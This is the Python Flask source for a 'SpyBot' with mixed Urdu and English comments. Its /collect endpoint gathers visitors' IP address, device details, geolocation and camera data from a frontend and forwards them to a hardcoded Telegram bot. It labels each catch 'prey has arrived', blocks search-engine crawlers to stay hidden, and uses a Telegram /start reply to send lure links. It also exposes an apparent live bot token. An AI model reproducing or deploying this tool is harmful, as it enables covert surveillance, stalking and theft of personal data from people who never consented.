from flask import Flask, request, jsonify, abort
import requests

app = Flask(__name__)

# ✅ آپ کے BOT کا TOKEN اور CHAT ID
BOT_TOKEN = '7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg'
CHAT_ID = '6908281054'

# ❌ Block known bots (Google, Bing, etc.)
BLOCKED_BOTS = ['Googlebot', 'bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider', 'YandexBot', 'Sogou', 'Exabot']

@app.before_request
def block_bots():
    ua = request.headers.get('User-Agent', '')
    for bot in BLOCKED_BOTS:
        if bot.lower() in ua.lower():
            abort(403)

# ✅ Telegram Spy Message Sender
def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        requests.post(url, json=payload)
    except Exception as e:
        print("❌ Telegram error:", e)

# ✅ Spy Data Collector from frontend
@app.route("/collect", methods=["POST"])
def collect():
    data = request.get_json()

    user_ip = request.remote_addr
    user_agent = data.get("userAgent", "Unknown")
    device_info = data.get("deviceInfo", "Unknown")
    latitude = data.get("latitude", "❌ Location Not Available")
    longitude = data.get("longitude", "❌ Location Not Available")
    camera = data.get("camera", "❌ Camera Denied")

    location_info = f"📍 Location: {latitude}, {longitude}" if latitude != "❌ Location Not Available" else "📍 Location: ❌ Not Available"

    msg = f"""👁️ <b>شکار آیا!</b>
🌐 <b>IP Address:</b> {user_ip}
📱 <b>Device:</b> {user_agent}
{location_info}
📷 <b>Camera:</b> {camera}
🧠 <b>Device Info:</b> {device_info}
    """
    send_to_telegram(msg)
    return jsonify({"status": "✅ Received"})

# ✅ Telegram Bot Webhook
@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def telegram_webhook():
    update = request.get_json()
    if "message" in update:
        chat_id = update["message"]["chat"]["id"]
        text = update["message"].get("text", "")
        if text == "/start":
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
                "chat_id": chat_id,
                "text": "👋 خوش آمدید!\n👇 نیچے دیے گئے لنک پر کلک کریں:\nhttps://faizan-spybot.onrender.com"
            })
    return jsonify({"status": "✅ Handled"})

# ✅ Default Route
@app.route("/")
def home():
    return "✅ Faizan™ SpyBot is Live"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
